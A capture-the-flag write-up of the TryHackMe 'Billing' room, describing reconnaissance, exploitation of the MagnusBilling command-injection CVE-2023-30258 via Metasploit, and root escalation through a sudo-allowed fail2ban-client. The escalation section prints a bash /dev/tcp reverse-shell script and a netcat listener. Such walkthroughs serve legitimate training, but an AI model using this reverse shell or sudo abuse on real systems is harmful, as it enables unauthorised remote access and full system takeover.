---
title: 'TryHackMe: Billing'
date: 2026-07-20
author: Stephan Schwarzmann
---

## Room Overview

| Difficulty | Platform | Room | Topics |
|------------|----------|--------|
| Easy | TryHackMe | [Billing](https://tryhackme.com/room/billing) | RCE, Linux PrivEsc |

## Room description

*"Some mistakes can be costly."*

> Gain a shell, find the way and escalate your privileges!*
> **Note**: Bruteforcing is out of scope for this room.*

## Reconnaissance

- IP
- open ports
- initial service discovery

For readability, I use `billing.thm` throughout this write-up. The hostname was mapped to the current TryHackMe target IP in `/etc/hosts`.

A first check with `nmap -sS -Pn -p- billing.thm` reveals:

```console
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown
```

Looking closer at these ports:

```console
nmap -v -sV -p22,80,3306,5038 billing.thm

22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Port 80, Apache and Website

Content discovery for port 80 via `gobuster dir -u http://billing.thm -w /usr/share/wordlists/dirb/common.txt` shows

```console
index.php            (Status: 302) [Size: 1] [--> ./mbilling]
```

Visiting `http://billing.thm/mbilling` shows that the `MagnusBilling` platform is used. Looking closer at the directory via

`gobuster dir -u http://billing.thm/mbilling/ -w /usr/share/wordlists/dirb/common.txt`

reveals (excerpt)

```console
archive              (Status: 301) [Size: 321] [--> http://billing.thm/mbilling/archive/]
assets               (Status: 301) [Size: 320] [--> http://billing.thm/mbilling/assets/]
development.log      (Status: 403) [Size: 276]
fpdf                 (Status: 301) [Size: 318] [--> http://billing.thm/mbilling/fpdf/]
index.html           (Status: 200) [Size: 30760]
index.php            (Status: 200) [Size: 663]
lib                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/lib/]
LICENSE              (Status: 200) [Size: 7652]
production.log       (Status: 403) [Size: 276]
protected            (Status: 403) [Size: 276]
resources            (Status: 301) [Size: 323] [--> http://billing.thm/mbilling/resources/]
spamlog.log          (Status: 403) [Size: 276]
tmp                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/tmp/]
```

The HTML source code refers to a script `blue-neptune.json` which we find at `http://billing.thm/mbilling/blue-neptune.json`.

It contains `name "MBilling" version "6.0.0.0"`.


### Asterisk

`telnet billing.thm 5038` tells us: `Asterisk Call Manager/2.10.6`.

### MariaDB and SSH

I did not look for further information reg. `MariaDB` and `SSH` ports.


## Vulnerability Analysis

### SSH

The SSH version is affected by `CVE-2024-6387` ("regreSSHion", score 8.1), but only 32 bit systems.
The most significant risk is Remote Code Execution, however this outcome requires significant resources to exploit.

### Apache and web application

The discovered `MagnusBilling` version is affected by a [serious vulnerability](https://nvd.nist.gov/vuln/detail/cve-2023-30258) with score 9.8:

*Command Injection vulnerability in MagnusSolution magnusbilling 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request.*

MetaSploit provides an exploit for this CVE: `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`


### MariaDB and Asterisk

I skipped further work on these because the found CVE looked like a promising path.


## Initial Access

I used the MetaSploit exploit for `CVE-2023-30258`: `use linux/http/magnusbilling_unauth_rce_cve_2023_30258`.
After setting `RHOSTS` and `LHOST`, running `exploit` results in the initial access as user `asterisk`.


## Privilege Escalation

User `asterisk` can execute several programs with `sudo` permissions:

```console
$ sudo -l
Matching Defaults entries for asterisk on ip-10-113-173-7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-113-173-7:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

[GTFOBins](https://gtfobins.org/) shows that `fail2ban-client`, which is among those programs, can be used for privilege escalation.
It describes two possible approaches to exploit `fail2ban-client`.
I needed to use the approach (b) which sets up a `fail2ban` configuration directory.
The `action` triggers a script which starts a reverse shell tha we receive via `nc -lvnp 4444`.

```bash
cat >/tmp/root-shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<my_tun0_ipaddr>/4444 0>&1
EOF

chmod +x /tmp/root-shell.sh
```

The action is triggered when restarting `fail2ban` with the new directory:

`sudo fail2ban-client -c /path/to/temp-dir/ -v restart`


## Post Exploitation

We retrieve the flags from `/home/magnus/user.txt` and `/root/root.txt`.


## Lessons Learned

I am leaving most of the (futile) efforts away, but as always, these findings were not always straightforward.

After finishing the room, THM provided feedback for the approach, some of which I did not understand:

I was told to enumerate earlier with `sudo -l`, but that was about the first action I performed after gaining initial access.
It took me probably too long to understand how to exploit `fail2ban` via `sudo` and set it up correctly with the second approach described on [GTFOBins](https://gtfobins.org). 

